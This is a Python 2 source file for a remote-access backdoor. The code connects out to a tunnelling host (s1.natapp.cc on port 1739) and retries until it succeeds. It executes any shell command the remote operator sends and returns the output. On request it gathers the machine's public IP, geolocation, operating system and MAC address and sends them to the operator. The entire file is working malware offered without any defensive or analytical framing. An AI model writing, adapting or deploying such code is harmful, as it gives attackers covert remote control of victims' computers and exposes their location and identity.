# coding:utf-8
'''

'''

import socket
import subprocess
import uuid
import platform
import json
from urllib2 import urlopen
import threading
import time

class Backdoor():
    def __init__(self):
        self.host = 's1.natapp.cc'#'s1.natapp.cc'
        self.port = 1739#1739
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.disconnect=True
        self.sysstr = platform.system()
        self.mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        self.name = 'steven'#socket.getfqdn(socket.gethostname())

        self.beat_num = str(int(self.mac, 16))

        pass

    #执行命令
    def cmd_exec(self,cmd):
        sub = subprocess.Popen(cmd, shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        out, err = sub.communicate()
        result = str(out) + str(err)
        msg=self.get_binary(1,result)
        self.send_msg(msg)
        pass

    #反向尝试连接
    def try_connect(self):
        while 1:
            try:
                self.conn.connect((self.host, self.port))
                self.disconnect=False
                break
            except:
                self.disconnect=True
                print '[error]Try connecting...'
                time.sleep(2)
        self.get_cmd()

    #获取本机信息
    def get_info(self):
        # 获取ip
        res = urlopen('https://jsonip.com/')
        if res.getcode() == 200:
            resJson = json.loads(res.read())
            self.ip = resJson.get('ip')
        else:
            print '[error]get ip'
        # 获取地理位置
        response = urlopen("http://freegeoip.net/json/" + self.ip).read().decode('utf-8')
        responseJson = json.loads(response)
        self.latitude = responseJson.get("latitude")
        self.longtitude = responseJson.get("longitude")
        self.country = responseJson.get('country_name')
        self.city = responseJson.get('city')
        self.flag = 'online'
        info_list = [self.beat_num,self.ip, self.country, self.city, str(self.latitude) + '/' + str(self.longtitude), self.sysstr,
                     self.mac, self.name, self.flag]
        info = ''
        for x in info_list:
            info += x + ','
        msg=self.get_binary(0,info)
        self.send_msg(msg)
        pass

    #对信息进行编码
    def get_binary(self, num, content, fill_num=3):
        return str(bin(num))[2:].zfill(fill_num) + str(content)

    #发送信息
    def send_msg(self, msg):
        print "[msg]"+msg
        self.conn.send(msg)
        pass

    #监听命令
    def get_cmd(self):
        while 1:
            try:
                cmd=str(self.conn.recv(1024))
                if len(cmd)!=0:
                    if cmd=='000':#发送info
                        self.get_info()
                    else:
                        self.cmd_exec(cmd)
            except:
                pass
        pass

if __name__ == '__main__':
    c=Backdoor()
    c.try_connect()



